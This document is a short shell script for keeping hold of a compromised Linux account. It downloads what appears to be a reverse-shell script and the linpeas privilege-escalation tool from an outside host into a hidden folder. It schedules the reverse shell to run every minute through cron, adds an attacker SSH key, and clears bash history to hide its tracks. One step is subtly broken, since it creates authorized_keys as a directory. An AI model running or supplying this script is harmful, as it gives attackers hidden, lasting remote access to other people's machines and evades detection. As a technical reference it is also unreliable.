#!/bin/sh

# Download scripts to obscure location
cd ~/.config/
wget http://192.168.10.89:8000/victim/rev.sh
wget http://192.168.10.89:8000/victim/linpeas.sh

# Allow execution
chmod +x rev.sh
chmod +x linpeas.sh

# Add user cronjob
(crontab -l ; echo "* * * * * ~/.config/rev.sh")|crontab 2> /dev/null

# Add ssh key
mkdir ~/.ssh
mkdir ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1---------SNIP--------3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys

# Delete bash history
history -c

echo "Done"
